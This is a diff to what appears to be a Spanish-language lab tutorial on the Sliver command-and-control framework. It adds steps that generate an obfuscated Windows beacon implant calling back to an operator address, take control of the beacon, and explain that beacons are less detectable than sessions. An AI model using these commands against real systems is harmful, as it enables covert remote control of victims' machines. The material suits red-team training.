@@ -291,7 +291,7 @@ sliver > sessions
 
  ID         Transport   Remote Address         Hostname          Username     Operating System   Health
 ========== =========== ====================== ================= ============ ================== =========
- 06ec1002   http(s)     192.168.14.129:50487   DESKTOP-B9JJBCA   User.       windows/amd64      [ALIVE]
+ 06ec1002   http(s)     192.168.14.129:50487   DESKTOP-B9JJBCA   User        windows/amd64      [ALIVE]
 ```
 Para interactuar con una sesión abierta se usa el siguiente comando. 
 
@@ -299,6 +299,35 @@ Para interactuar con una sesión abierta se usa el siguiente comando.
 sliver > sessions -i 06ec1002
 
 [*] Active session POISED_ASTROLOGER (06ec1002)
+```
+
+Otra forma de generar el implante es como beacon. 
+
+```bash
+sliver > generate beacon -e -f exe -b 192.168.14.130 -o windows
+
+[*] Generating new windows/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:28
+[*] Implant saved to /home/kali/CERTAIN_PRISON.exe
+
+[*] Beacon 4020c53e CERTAIN_PRISON - 192.168.14.129:57426 (DESKTOP-B9JJBCA) - windows/amd64 - Wed, 22 Jun 2022 22:13:39 EDT
+```
+
+La diferencia entre session y beacon es que con el primero se establece una conexión persistente, con el segundo las conexiones se hacen con intervalos de tiempo lo que lo vuelve menos detectable. 
+
+Para interactuar con el beacon se lo realiza con el siguiente comando. 
+
+```bash
+sliver > beacons
+
+ ID         Name             Transport   Username     Operating System   Last Check-In   Next Check-In
+========== ================ =========== ============ ================== =============== ===============
+ 4020c53e   CERTAIN_PRISON   http(s)     User        windows/amd64      42s ago         25s
+
+sliver > use 4020c53e
+
+[*] Active beacon CERTAIN_PRISON (4020c53e-9dc0-43ca-b808-4aa663c74903
 ```
 
 # Referencias:
